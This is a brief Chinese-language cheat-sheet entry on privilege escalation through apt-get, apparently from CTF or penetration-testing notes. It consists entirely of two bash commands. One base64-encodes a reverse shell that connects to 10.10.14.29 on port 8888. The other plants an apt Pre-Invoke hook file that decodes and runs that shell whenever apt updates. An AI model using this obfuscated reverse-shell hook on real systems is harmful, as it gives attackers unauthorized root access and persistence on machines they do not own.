# apt-get提权

需要修改base64

```bash
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.29/8888 0>&1"' | base64 -w0

echo 'apt::Update::Pre-Invoke {"echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjkvODg4OCAwPiYxIgo= | base64 -d | bash"};' > 000-shell
```
